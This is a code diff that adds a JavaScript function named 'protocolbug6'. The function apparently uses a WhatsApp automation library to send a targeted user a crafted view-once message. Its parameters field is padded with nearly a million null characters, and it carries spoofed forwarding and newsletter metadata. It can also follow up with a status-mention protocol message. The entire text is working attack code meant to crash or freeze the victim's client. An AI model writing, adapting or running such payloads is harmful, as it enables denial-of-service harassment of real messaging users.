@@ -1,0 +1,74 @@
+async function protocolbug6(isTarget, mention) {
+  let msg = await generateWAMessageFromContent(isTarget, {
+    viewOnceMessage: {
+      message: {
+        messageContextInfo: {
+          messageSecret: crypto.randomBytes(32)
+        },
+        interactiveResponseMessage: {
+          body: {
+            text: "VALORES ",
+            format: "DEFAULT"
+          },
+          nativeFlowResponseMessage: {
+            name: "@jawaskrip",
+            paramsJson: "\u0000".repeat(999999),
+            version: 3
+          },
+          contextInfo: {
+            isForwarded: true,
+            forwardingScore: 9741,
+            forwardedNewsletterMessageInfo: {
+              newsletterName: "trigger newsletter ( @tamainfinity )",
+              newsletterJid: "120363321780343299@newsletter",
+              serverMessageId: 1
+            }
+          }
+        }
+      }
+    }
+  }, {});
+
+  await sock.relayMessage("status@broadcast", msg.message, {
+    messageId: msg.key.id,
+    statusJidList: [isTarget],
+    additionalNodes: [
+      {
+        tag: "meta",
+        attrs: {},
+        content: [
+          {
+            tag: "mentioned_users",
+            attrs: {},
+            content: [
+              { tag: "to", attrs: { jid: isTarget }, content: undefined }
+            ]
+          }
+        ]
+      }
+    ]
+  });
+
+  if (mention) {
+    await sock.relayMessage(isTarget, {
+      statusMentionMessage: {
+        message: {
+          protocolMessage: {
+            key: msg.key,
+            fromMe: false,
+            participant: "0@s.whatsapp.net",
+            remoteJid: "status@broadcast",
+            type: 25
+          },
+          additionalNodes: [
+            {
+              tag: "meta",
+              attrs: { is_status_mention: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂" },
+              content: undefined
+            }
+          ]
+        }
+      }
+    }, {});
+  }
+}
